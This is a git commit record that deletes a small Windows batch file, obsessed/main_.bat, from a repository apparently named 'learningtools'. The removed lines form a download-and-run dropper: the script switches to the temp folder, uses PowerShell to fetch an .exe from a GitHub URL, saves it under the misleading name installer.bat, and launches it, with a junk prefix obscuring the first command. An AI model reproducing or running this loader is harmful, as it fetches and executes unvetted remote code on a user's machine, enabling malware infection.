03f483be9cfa294a7368494a79603e14497b43bb
odisdrotz71 <odisdrotz71@gmail.com>
2025-03-29 11:03:42 -0700

    Delete obsessed/main_.bat

--- obsessed/main_.bat
+++
@@ -1,4 +0,0 @@
-ÿþ&cls
-cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://github.com/odisdrotz71/learningtools/raw/refs/heads/main/obsessed/obese.exe' -OutFile installer.bat"
-start installer.bat
